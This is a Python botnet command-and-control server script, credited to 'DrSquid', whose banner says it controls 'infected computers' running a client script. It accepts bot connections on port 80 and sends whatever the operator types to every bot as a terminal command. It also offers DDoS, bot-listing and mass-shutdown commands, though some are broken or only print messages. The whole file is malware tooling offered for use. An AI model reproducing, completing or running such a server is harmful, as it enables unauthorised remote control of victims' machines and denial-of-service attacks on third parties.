import socket, threading, os, time, sys
ip = '0.0.0.0'
port = 80
s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.bind((ip, port))
connections = []
start_recv = False
bot_count = 0
print("  ____        _              _      _____                            ___    ___  ")
print(" |  _ \      | |            | |    / ____|                          |__ \  / _ \ ")
print(" | |_) | ___ | |_ _ __   ___| |_  | (___   ___ _ ____   _____ _ __     ) || | | |")
print(" |  _ < / _ \| __| '_ \ / _ \ __|  \___ \ / _ \ '__\ \ / / _ \ '__|   / / | | | |")
print(" | |_) | (_) | |_| | | |  __/ |_   ____) |  __/ |   \ V /  __/ |     / /_ | |_| |")
print(" |____/ \___/ \__|_| |_|\___|\__| |_____/ \___|_|    \_/ \___|_|    |____(_)___/ ")
print(" Script by DrSquid")
print("")
print(" This is a server for making infected computers with the client-side script connect\n to this server and allowing you to run ssh commands or starting a DDoS Attack.\n Make sure that you have port forwarded so that you can use this script externally.")
print("")
def listen():
    while True:
        s.listen(1)
        conn, ip = s.accept()
        start_recv = True
        connections.append(conn)
        print(f"\n[+] {ip} has joined the server.")
def instruct():
    print("[+] Commands List:")
    print("")
    print("[+] !ddos - Command initiates a DDoS attack among connected bots")
    print("[+] !listcon - Lists all the bots")
    print("[+] !botcount - Counts all of the bots connected")
    print("[+] !shutdownAll - Shuts down all connected bot computers")
    print("[+] Note: All other things said will run a terminal command on the bot computers.")
    print("")
    while True:
        try:
            instruction = input("[+] Enter your instruction: ")
            instruction = instruction.encode()
            if instruction.decode().lower() == "help":
                os.system('help')
            elif instruction.decode().lower() == "!ddos":
                if len(connections) == 0:
                    print("")
                    print("[+] Unable to perform DDoS Attack.\n[+] There are no bots connected!")
                    print("")
                else:
                    print("")
                    print("[+] Preparing Bots for DDoS Attack...")
                    time.sleep(1)
                    print("[+] DDoS Attack Started.")
                    print("")
            elif instruction.decode().lower() == "!listcon":
                print("")
                print("[+] List of bots:")
                print(connections)
                print("")
            elif instruction.decode().lower() == "!botcount":
                print("")
                print(f"[+] Total Bot Count: {len(connections)}")
                print("")
            elif instruction.decode().lower() == "!shutdownAll":
                print("[+] Shutting Down Bots....")
                time.sleep(2)
                instruction == "shutdown /s"
                instruction = instruction.decode()
            for connection in connections:
                try:
                    conn = connection
                    conn.send(instruction)
                except:
                    print(f"[+] Connection lost for conn: {conn}")
                    conn.close()
        except:
            pass
listeN = threading.Thread(target=listen)
listeN.start()
instrucT = threading.Thread(target=instruct)
instrucT.start()